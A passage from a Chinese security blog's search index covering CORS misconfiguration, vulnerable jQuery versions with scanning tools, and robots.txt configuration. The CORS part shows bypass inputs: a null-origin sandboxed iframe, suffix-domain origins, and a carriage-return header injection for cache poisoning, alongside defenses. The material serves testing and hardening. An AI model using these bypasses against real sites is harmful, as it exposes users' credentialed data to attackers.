+<li><p><strong>信任自身全部子域</strong></p>
+<p>导致子域的XSS危害被强化。为了防止某个子域上XSS漏洞危害到其他子域，浏览器设计了Cookie的httponly标志，用于限制Javascript读取Cookie，因此某个子域XSS不能读取带有HttpOnly标志的Cookie，难以窃取其他重要子域上的敏感内容。但是如果这个域配置了CORS且信任全部子域，那么攻击者可以利用其他任意子域上XSS漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p>
+</li>
+<li><p><strong>Origin*与Credentials：true 共用</strong></p>
+</li>
+<li><p><strong>缺少Vary:Origin头</strong></p>
+<p>资源服务器共享多个域名，需要对每个请求域的跨域请求生成不同的访问控制策略，资源内容需要缓存。Vary：Origin的作用就是让同一个URL有多份缓存。例如：c.com同时允许a.com和b.com共享。c.com资源内容首先被a.com脚本跨域访问后被缓存，其中缓存的响应头应该是Access-Control-Allow-Origin：<a href="http://a.com。此时b.com脚本就不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。" target="_blank" rel="noopener">http://a.com。此时b.com脚本就不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。</a></p>
+<p>如果是写死地Access-control-Allow-Origin，一定不要加Vary：Origin。如果是根据Origin动态的计算出Access-Control-Allow-Origin,那么要一定始终加上Vary:Origin，即便没有Origin请求头的情况下。</p>
+<h3 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h3><h4 id="4-1-三步测试CORS错误配置"><a href="#4-1-三步测试CORS错误配置" class="headerlink" title="4.1 三步测试CORS错误配置"></a>4.1 <strong>三步测试CORS错误配置</strong></h4><ol>
+<li>识别</li>
+<li>分析</li>
+<li>利用</li>
+</ol>
+<ul>
+<li><p><strong>识别</strong></p>
+<p>开启CORS，尝试使用不同的值，例null或者不同的域名（最好利用脚本自动化实现）</p>
+</li>
+<li><p><strong>分析</strong></p>
+<p>fuzzing请求包头中的Origin字段，分析返回的报文，查看哪些域是被允许的。哪些类型控件可以被控制，应用会返回哪种头部字段</p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如果利用配置错误的CORS应用，若Access-Control-Allow-Credentials未开启，需要其他条件去利用这个问题</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-2-存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性"><a href="#4-2-存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性" class="headerlink" title="4.2 存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性"></a>4.2 <strong>存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性</strong></h4><table>
+<thead>
+<tr>
+<th>Origin</th>
+<th>Access-Control-Allow-Credentials</th>
+<th>是否可利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://attacker.com" target="_blank" rel="noopener">https://attacker.com</a></td>
+<td>true</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>null</td>
+<td>true</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>*</td>
+<td>true</td>
+<td>yes</td>
+</tr>
+</tbody></table>
+<p>  泄露用户数据见：0x02泄露用户隐私数据</p>
+<h4 id="4-3服务器端缓存中毒"><a href="#4-3服务器端缓存中毒" class="headerlink" title="4.3服务器端缓存中毒"></a>4.3<strong>服务器端缓存中毒</strong></h4><p>  一种潜在的攻击方式利用CORS的错误配置注入HTTP头部，可能会被服务器端缓存下，例如制作存储型XSS</p>
+<p>  攻击的利用条件：</p>
+<ul>
+<li><p>存在服务器缓存</p>
+</li>
+<li><p>能够反射Origin头部</p>
+</li>
+<li><p>不会检查“Origin”头部的特殊字符，比如“\r”</p>
+<p>利用上述先决条件，就可以攻击（IE/EDGE浏览器）利用http头部注入的利用方式，因在使用”\r”（0x0d）作为HTTP头部字段的终结者</p>
+<p>请求：</p>
+</li>
+</ul>
+<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">GET / HTTP1.1</span><br><span class="line">Origin：z[0x0d]Content-Type:text/html; charset=UTF-7</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  IE处理后返回报文</p>
+<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin:z</span></span><br><span class="line">Content-Type:text/html;charset=UTF-7</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  上面攻击方式不能直接利用，因为攻击者无法保证受害者浏览器会提前发送畸形的头部。</p>
+<p>  如果攻击者能够提前发送畸形的“Origin”头部，比如利用代理或者命令行的方式发送，然后服务器就会缓存这样的返回报文并且也会传递给其他人。</p>
+<p>  上面得例子就可以让攻击者把攻击的页面编码变成UTF-7，这样就可能会引发XSS漏洞</p>
+<h4 id="4-4-绕过技术"><a href="#4-4-绕过技术" class="headerlink" title="4.4 绕过技术"></a>4.4 <strong>绕过技术</strong></h4><p>  有时需要信任不同的域或者所有的子域，开发者会利用正则表达式或者其它的方式去验证有效性。</p>
+<p>  下面利用一部分源来绕过某些验证技术，已验证有效性</p>
+<ul>
+<li><p>NULL源</p>
+<p>CORS规范中提及NULL源，触发这个源是为了网页跳转或者来自本地HTML文件</p>
+<p>目标应用可能会接受“NULL”源，并且这个可能被测试者（或者攻击者）利用，很容易使用沙盒iframe来获取NULL源</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-scripts allow-top-navigation allow-forms"</span> <span class="attr">src</span>=<span class="string">'data:text/html,&lt;script&gt;**CORS request here**&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>注：带有额外限制的iframe标签，sandbox属性值可以是空的字符串，也可使空格分割的预定义值列表。</p>
+<p>allow-top-navigation  允许 iframe 内容从包含文档导航（加载）内容 </p>
+<p>allow-forms               允许表单提交</p>
+<p>allow-scripts              允许脚本执行</p>
+</li>
+</ul>
+<p>  使用上述的iframe产生的请求类似于下面这样</p>
+  <figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">GET /handler</span><br><span class="line"><span class="attribute">Host</span>: target.loacl</span><br><span class="line">  Origin:null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>  如果目标应用接受”null“源，那么服务器将返回类似下面的数据报文</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin:null</span></span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials:true</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>  此类错误配置很常见，所以会很方便的去尝试</p>
+<ul>
+<li><p><strong>使用目标域名作为子域名</strong></p>
+<p>如果目标只检查Origin中的字符串是否包含“target.local”,那么就可以在自己控制的服务器上创建一个子域名。</p>
+<p>用这样的方式，请求一般产生于JavaScript代码，并且请求中的Origin回像下面这样</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Origin:https://target.local.attacker.domain</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>注册一个同名的域名</strong></p>
+<p>假设目标应用是使用基于下面的正则表达式去检测“Origin”头部的话：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">^https?:\/\/.*\.?target\.local$</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样的正则表达式包含着一个问题，就是导致这样的CORS配置容易收到被攻击。下面分解正则表达式。</p>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.*</td>
+<td>除了终止符的任何字符</td>
+</tr>
+<tr>
+<td>\ .</td>
+<td>一个点</td>
+</tr>
+<tr>
+<td>?</td>
+<td>此处匹配一个“.”一次或者零次</td>
+</tr>
+</tbody></table>
+<p>这个？只影响”.“这个字符串，因此”target.local“前面的任何字符串都是被允许的，而不管是否有”.”把他们隔开。因此只要在”Origin“末尾包含目标域名就可以绕过上面的限制，例目标域名target.local</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Origin：https://nottarget.local</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>攻击者只需要注册一个尾部包含目标域名的新域名就可以利用这样的漏洞了。</p>
+</li>
+<li><p><strong>控制目标的子域名</strong></p>
+<p>现在目标应用实现是基于下面的正则表达式去检测”Origin”头部的话：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">^https?:\ / \ /(.*\ .)?target\ .local$</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个允许来自target.local跨域访问，并且包含所有的子域名（来自HTTP协议或HTTPS协议）</p>
+<p>这个场景下，如果攻击者可以控制目标的有效的子域名（例domain.target.local”),如果能够接管一个子域名，或者找到一个有XSS漏洞的子域名。攻击者就可以产生一个有效的CORS请求。</p>
+</li>
+</ul>
+<h3 id="0x05-安全防御措施"><a href="#0x05-安全防御措施" class="headerlink" title="0x05 安全防御措施"></a>0x05 安全防御措施</h3><p>  对于防范CORS配置错误漏洞的防御从两个方面，一是一般守则，二是配置实施</p>
+<h4 id="4-1-一般守则"><a href="#4-1-一般守则" class="headerlink" title="4.1 一般守则"></a>4.1 <strong>一般守则</strong></h4><ul>
+<li><p><strong>如果不必要就不要开启CORS</strong></p>
+<p>要仔细评估是否开启CORS，如果没有必要，建议不要使用CORS，以免削弱SOP</p>
+</li>
+<li><p><strong>定义白名单</strong></p>
+<p>绝对必要的话，要定义“源”白名单，如果有可能不要使用正则表达式，正则表达式更容易出错，导致CORS的配置错误。不要配置“Access-Control-Allow-Origin”为通配符*，要严格校验请求数据中Origin的值，要检查Origin是一个可信的值。</p>
+</li>
+<li><p><strong>仅允许安全的协议</strong></p>
+<p>有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MITM)将绕过应用所使用的HTTPS。</p>
+</li>
+<li><p><strong>配置”VARY”头部</strong></p>
+<p>要尽可能返回“VARY：Origin”这个头部，以避免攻击者利用浏览器缓存。</p>
+</li>
+<li><p><strong>尽可能避免使用”CREDENTIALS”</strong></p>
+<p>如果Access-Control-Allow-credentials标头设置成true时，允许跨域请求中带有凭据数据，因此只要在严格必要才应配置。如果对参数设置模糊的话，就把值设置成“flase” </p>
+</li>
+<li><p><strong>限制使用的方法</strong></p>
+<p>通过”Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样就可以最大限度的减少所设计的方法，养成这个好习惯。</p>
+</li>
+<li><p><strong>限制缓存时间</strong></p>
+<p>建议通过“Access-Control-Allow-Method”和“Access-Control-ALlow-Headers”头部，限制浏览器缓存信息得时间。可以通过使用”Access-Control-Allow-Age”标题来完成，该头部接受时间作为输入，该数字是浏览器保存缓存的时间。配置相互较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。</p>
+</li>
+<li><p><strong>仅配置所需要的头</strong></p>
+<p>要仅在接受到跨域请求的时候才去配置有关跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）</p>
+</li>
+<li><p><strong>中转服务器</strong></p>
+<p>也是目前最常用的方法，使用Node.js搭建中转服务器，来进行请求的转发。</p>
+</li>
+</ul>
+<h4 id="4-2-配置和实施"><a href="#4-2-配置和实施" class="headerlink" title="4.2 配置和实施"></a>4.2 <strong>配置和实施</strong></h4><p>  ​    很多框架是允许使用CORS的，当使用这些解决方案的时候，我们要着重++,注意默认值++（“origin”和”credebtials”是否被明确的设置）因为有些默认值是不安全的。</p>
+<p>  分析一些主要的软件框架。下面表是总结的结果（注：这仅指默认设置，在所有情况下都可以以安全的方式配置它们）</p>
+<p>   <img src="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e31ff96-b980-1.png" alt="img">     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e7026a4-b980-1.png" alt="img" style="zoom: 50%;"> </p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的设置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：JQuery版本漏洞</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9AJQuery%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全要求：应用系统若采用第三方组件，应使用不存在已知安全漏洞的第三方组件版本。</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>​        jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。</p>
+<p>​        jQuery 1.4.0版本至1.11.3版本和1.12.4版本至2.2.4版本中存在跨站脚本漏洞，远程攻击者可以利用该漏洞执行任意的代码。jQuery 3.4.0之前版本中存在安全漏洞，攻击者可以利用该漏洞添加或更改Object.prototype的属性。注：Object.propotype属性表示Object的原型对象。</p>
+<p>​        目前，使用“具有已知漏洞的组件”已成为OWASP Top 10的一部分，不安全的库可能给web应用程序带来巨大的风险。</p>
+<p><strong>注：OWASP Top 10风险内容</strong></p>
+<table>
+<thead>
+<tr>
+<th>2013年版</th>
+<th>2017年版</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A1   注入</td>
+<td>A1   注入</td>
+</tr>
+<tr>
+<td>A2   失效的身份认证和会话管理</td>
+<td>A2   失效的身份认证</td>
+</tr>
+<tr>
+<td>A3   跨站脚本攻击（XSS）</td>
+<td>A3   敏感信息泄露</td>
+</tr>
+<tr>
+<td>A4   不安全的对象直接引用</td>
+<td>A4   XML外部处理器漏洞（XXE）</td>
+</tr>
+<tr>
+<td>A5   安全配置错误</td>
+<td>A5   失效的访问控制</td>
+</tr>
+<tr>
+<td>A6   敏感信息泄露</td>
+<td>A6    安全配置错误</td>
+</tr>
+<tr>
+<td>A7   功能级访问控制缺失</td>
+<td>A7    跨站脚本攻击（XSS)</td>
+</tr>
+<tr>
+<td>A8   跨站请求伪造</td>
+<td>A8   不安全的反序列化</td>
+</tr>
+<tr>
+<td>A9   使用含有已知漏洞的组件</td>
+<td>A9   使用含有已知漏洞的组件</td>
+</tr>
+<tr>
+<td>A10 未验证的重定向和转发</td>
+<td>A10 不足的日志记录和监控</td>
+</tr>
+</tbody></table>
+<p>为了保护自身应用的安全，对使用的开源软件进行漏洞检测就显得十分必要。对于开源软件而言，常规的代码检测（即对开源软件的代码进行扫描，找出其中的漏洞并进行修补）会消耗大量的时间和人力，与软件的快速开发迭代的理念相违背，同时也不利于新版本的集成。</p>
+<p>开源软件的漏洞检测是对当前正在使用的组件版本进行测试，找出其中是否存在已知的漏洞，可与通过CVE、CNVD等漏洞库进行漏洞对比，如果存在严重漏洞，则应当避免使用该版本组件，转而使用最新版本或功能类似的不存在漏洞的开源软件。</p>
+<h3 id="0x01-潜在缺陷"><a href="#0x01-潜在缺陷" class="headerlink" title="0x01 潜在缺陷"></a>0x01 潜在缺陷</h3><p>如果应用或者系统存在下面的情况，那么很有可能面临组件缺陷的威胁。</p>
+<ul>
+<li>不知道所使用组件的版本，这里的组件既包括直接引用的组件，也包括间接引用的组件（组件引用组件）</li>
+<li>没有定期对所使用的组件进行安全扫描</li>
+<li>没有定期对所使用的组件进行更新</li>
+</ul>
+<h3 id="0x02-检测缺陷组件"><a href="#0x02-检测缺陷组件" class="headerlink" title="0x02 检测缺陷组件"></a>0x02 检测缺陷组件</h3><p>根据组件运行的位置不同，可以分为客户端组件和服务端组件，进行组件安全检测时候要分别进行检测，下面介绍3种组件缺陷检测工具</p>
+<ul>
+<li>Retire.js：对客户端运行的JavaScript组件进行安全检测。</li>
+<li>OWASP DepenDency Check:对服务端使用的Java组件进行安全检测。</li>
+<li>Sonatype AHC:对软件所使用的组件进行全方位检测，包括客户端和服务端。</li>
+</ul>
+<h4 id="2-1-Retire-js"><a href="#2-1-Retire-js" class="headerlink" title="2.1 Retire.js"></a>2.1 <strong>Retire.js</strong></h4><p>Retire.js主要对Javascript组件进行安全检测，可以使用很多种方式进行扫描。</p>
+<ul>
+<li>命令行扫描： 以命令行的方式进行扫描，需要安装Retire，具体的安装命令为npm install -g retire。此外，使用retire -h可以查看详细的命令帮助。</li>
+<li>Grunt扫描： 运行Retire.js的Grunt任务是应用程序构建中的一部分。</li>
+<li>Gulp任务扫描：自动监视和扫描项目文件</li>
+<li>浏览器插件扫描： 可以安装Chrome、Firefox等浏览器的Retire.js插件，扫描当前页面中引入的javascript库</li>
+<li>中间人工具插件扫描：可以将Retire.js作为插件安装到Burp suite、ZAP等中间人拦截工具当中，被动扫描加载的Javascript组件，并根据文件特性识别漏洞（如URl、文件名、文件内容以及特定的散列值等）。</li>
+</ul>
+<h4 id="2-2-OWASP-Dependency-Check"><a href="#2-2-OWASP-Dependency-Check" class="headerlink" title="2.2 OWASP Dependency Check"></a>2.2 <strong>OWASP Dependency Check</strong></h4><p>OWASP Dependency Check用于识别项目的依赖关系，并检查应用程序的依赖库中是否存在有缺陷的组件，该工具使用NVD的数据源进行自动更新，可以通过命令行、Ant任务、Maven插件、Gradle插件、Sonar插件等多种方式运行。</p>
+<p>首次应该需要更新漏洞库的相关信息，时间稍微较长，之后只需要去维护一个小的XML文件更新本地副本即可，非常方便。</p>
+<p>例：通过Maven插件的方式进行依赖组件的检测。在pom.xml中进行如下配置：</p>
+<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">	……</span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.0-M2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">	……</span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>默认情况下，check的操作是绑定在maven verify和site的生命周期中。</p>
+<h4 id="2-3-Sonartype-AHC"><a href="#2-3-Sonartype-AHC" class="headerlink" title="2.3 Sonartype AHC"></a>2.3 <strong>Sonartype AHC</strong></h4><p>sonartype AHC全程是Sonartype Appliaction Health Check，是Sonartype出品的，用于对依赖组件进行全面安全检测的工具。该工具以“可运行软件包”的方式提供下载，下载的地址为：<a href="https://www.sonatype.com/software-bill-of-materials" target="_blank" rel="noopener">https://www.sonatype.com/software-bill-of-materials</a> 。</p>
+<p>开始运行界面如下：</p>
+<p>界面4个输入框：</p>
+<ul>
+<li>No1. 输入邮箱地址，地址用来接收分析报告</li>
+<li>No2. 选择需要分析的文件，本次测试选择Webgoat-server-8.0.0.M25.jar文件</li>
+<li>No3. 输入分析报告的名称</li>
+<li>No4. 输入查看报告的密码</li>
+</ul>
+<p>文件分析结束之后，分析报告会发送到填写注册的邮箱之中，详情如下：</p>
+<p>点击相关链接，在浏览器中会首先进行账号的验证，然后查看相关详细报告，报告分析了4个部分，分别如下：</p>
+<ul>
+<li>Summary: 应用依赖组件分析的概要</li>
+<li>Policy Violations: 应用依赖组件违反的政策法规</li>
+<li>Security Issues： 应用依赖组件的安全问题详情</li>
+<li>License Analysis: 组件的授权许可</li>
+</ul>
+<p>应用程序共包含117个组件，其中81%确定了组件来源。发现了33处政策违规，其中严重22处，中等严重11处。共发现79处安全警告，影响了22个组件。有26个授权许可声明。</p>
+<p>安全问题是等级越高问题越严重。组件依赖深度及问题分布的概述图，从左往右依次表示严重、中等严重、一般问题。从上到下表示对组件的依赖程度，1表示直接引用，2表示间接引用等。</p>
+<p>按照组件安全问题的10个等级进行依次展开。</p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>以上检测方式只使用少量软件的检测，如果进行大量的软件安全检测，可以将这个检测工具与代码管理平台Sonar、maven或者Jenkins等软件进行集成，持行依赖分析。</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：Robots文件配置（互联网应用）</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ARobots%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE%EF%BC%88%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%EF%BC%89/</url>
+    <content><![CDATA[<p>安全性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全要求：配置Robots.txt，默认禁止对根目录的爬行。业务按需列出允许爬虫访问访问范围，防止访问敏感数据。</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>搜索引擎通过Spider爬取网页的内容，并展示在相关的搜索结果中。但有些网页我们不希望被搜索引擎收录或者索引，例管理员后台等。</p>
+<p>我们可以通过配置Robits.txt文件声明允许/禁止搜索引擎Spider抓取某些目录或者网页，从而限制搜索引擎的收录范围。</p>
+<h3 id="0x01-什么是Robots-txt？"><a href="#0x01-什么是Robots-txt？" class="headerlink" title="0x01 什么是Robots.txt？"></a>0x01 什么是Robots.txt？</h3><p>Robots.txt是存放在网站根目录下的一个纯文本文件，用来告诉Spider本站中哪些内容是允许爬取，哪些内容是不允许爬取的。搜索引擎的Spider在访问网站时，会首先检查网站的Robots.txt文件，获取允许在网站上爬取范围。</p>
+<p>注：Robots.txt只是一种大家约定成俗的规则，并不是强制的。有些搜索引擎并不支持，所以不能保证网页内容一定会或不会被爬取。</p>
+<p>如果不存在Robots.txt文件，Spider将能够访问网站上所有没有口令保护的网页，同时Robots.txt文件是公开访问的，攻击者可以通过分析Robots.txt文件内容来获取敏感的目录或文件路径等信息。</p>
+<p>robots.txt文件中列出的指令仅适用于该文件所在的主机、协议和端口号。</p>
+<h3 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h3><p>Robots.txt文件可能泄露系统中的敏感信息，如后台地址或不愿意对外公开的地址等，攻击者可以利用这些信息进行下一步的攻击。</p>
+<h3 id="0x03-Robots-txt文件设置规则"><a href="#0x03-Robots-txt文件设置规则" class="headerlink" title="0x03 Robots.txt文件设置规则"></a>0x03 Robots.txt文件设置规则</h3><h4 id="3-1-格式和位置"><a href="#3-1-格式和位置" class="headerlink" title="3.1 格式和位置"></a>3.1 <strong>格式和位置</strong></h4><ul>
+<li>文件名必须为 robots.txt （全部小写）</li>
+<li>文件格式为UTF-8编码的纯文本文件</li>
+<li>必须存放在网站根目录下，可通过<a href="http://www.example.com/robots.txt访问到" target="_blank" rel="noopener">http://www.example.com/robots.txt访问到</a></li>
+<li>每个网站有且只能由一个robots.txt文件</li>
+<li>开头的后面为备注内容</li>
+<li>注意要使用英文字符</li>
+</ul>
+<p>每条记录均由</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">字段：值</span><br></pre></td></tr></tbody></table></figure>
+
+<p> 组成，如 Sitemap:<a href="https://example.com/sitemap.xml" target="_blank" rel="noopener">https://example.com/sitemap.xml</a></p>
+<ul>
+<li>User-agent：用于指定指令所作用于的目标抓取工具（网络蜘蛛），后接抓取工具名称</li>
+<li>Disallow：指定不允许抓取的目录或网页，后边为空则表示允许抓取一切页面</li>
+<li>Allow：允许抓取得目录或网页</li>
+<li>Sitemap：站点地图的位置，必须是绝对路径</li>
+<li>*：表示通配符</li>
+<li>$：表示网址结束</li>
+<li>/：匹配根目录以及任何下级网址</li>
+</ul>
+<p><strong>示例：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line"># 允许所有机器抓取所有内容</span><br><span class="line">User-agent:*</span><br><span class="line">Disallow:</span><br><span class="line">或</span><br><span class="line">User-agent:*</span><br><span class="line">Allow:/</span><br><span class="line"></span><br><span class="line"># 仅允许特定的机器人抓取（name_spider用真实名称代替）</span><br><span class="line">User-agent:name_spider</span><br><span class="line">Allow:</span><br><span class="line"></span><br><span class="line"># 拦截所有的机器人</span><br><span class="line">User-agent:*</span><br><span class="line">DisAllow:/</span><br><span class="line"></span><br><span class="line"># 禁止所有机器访问特定目录</span><br><span class="line">User-agent:*</span><br><span class="line">Disallow:/cgi-bin/</span><br><span class="line">Disallow:/images/</span><br><span class="line">Disallow:/tmp/</span><br><span class="line">Disallow:/private/</span><br><span class="line"></span><br><span class="line"># 仅禁止坏爬虫访问特定目录（BadBot用真实名称代替）</span><br><span class="line">User-agent:BadBot</span><br><span class="line">Disallow:/private/</span><br><span class="line"></span><br><span class="line"># 禁止所有机器人访问特定文件类型</span><br><span class="line">User-agent:*</span><br><span class="line">Disallow:/*.php$</span><br><span class="line">Disallow:/*.js$</span><br><span class="line">Disallow:/*.inc$</span><br><span class="line">Disalloe:/*.css$</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="3-3-处理HTTP结果代码"><a href="#3-3-处理HTTP结果代码" class="headerlink" title="3.3 处理HTTP结果代码"></a>3.3 <strong>处理HTTP结果代码</strong></h4><p>一般情况下，robots.txt文件会出现三种不同的抓取结果：</p>
+<ul>
+<li>全部允许：所有内容均可抓取</li>
+<li>全部禁止：所有内容均不能抓取</li>
+<li>有条件的允许：robots.txt中的指令决定是否可以抓取某些内容</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>2XX(成功)</th>
+<th>HTTP结果代码，表示成功的“有条件地允许”抓取结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3XX(重定向)</td>
+<td>Google会跟踪至少五次重定向，然后便会停止，并将其处理为404错误</td>
+</tr>
+<tr>
+<td>4XX(客户端错误)</td>
+<td>系统会对所有4XX错误都采用同一种处理方式，并且假定不存在有效的robots.txt文件。Google假定不存在任何限制。这表示抓取时“全部允许”。注：包括401”未授权“和403”禁止访问”HTTP结果代码。</td>
+</tr>
+<tr>
+<td>5XX(服务器错误)</td>
+<td>将服务器错误视作会导致抓取作业“全部禁止”的临时性错误。系统会再次尝试发送该请求，直到获得非服务器错误的HTTP结果代码。</td>
+</tr>
+<tr>
+<td>请求不成功或数据不完整</td>
+<td>系统会将因DNS或网络问题（超时、响应无效、重置或断开连接、HTTP组块错误等）而无法抓取的robots.txt文件的处理视为服务器错误</td>
+</tr>
+<tr>
+<td>缓存</td>
+<td>一般情况下，robots.txt内容最多可缓存24小时，但是在无法刷新缓存版本的情况下，缓存时间可能会延长。缓存的响应可由不同的抓取工具共享</td>
+</tr>
+</tbody></table>
+<h3 id="0x04-常用搜索Sipder（机器人）名称"><a href="#0x04-常用搜索Sipder（机器人）名称" class="headerlink" title="0x04 常用搜索Sipder（机器人）名称"></a>0x04 常用搜索Sipder（机器人）名称</h3><ul>
+<li>谷歌蜘蛛：Googlebot、Googlebot-Mobile、Googlebot-Image</li>
+<li>百度蜘蛛：Baiduspider、Baiduspider-moblie、Baiduspider-image</li>
+<li>搜狗蜘蛛：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider</li>
+<li>必应蜘蛛：bingbot</li>
+<li>360蜘蛛：360Spider</li>
+<li>有道蜘蛛：YoudaoBot</li>
+<li>雅虎蜘蛛：slurp</li>
+<li>Yandex蜘蛛：yandex</li>
+</ul>
+<p>具体编写一些蜘蛛名称时，若不清楚可以参考一些大站的写法，如:</p>
+<ul>
+<li><a href="https://www.baidu.com/robots.txt" target="_blank" rel="noopener">https://www.baidu.com/robots.txt</a> </li>
+<li><a href="https://www.google.com/robots.txt" target="_blank" rel="noopener">https://www.google.com/robots.txt</a> </li>
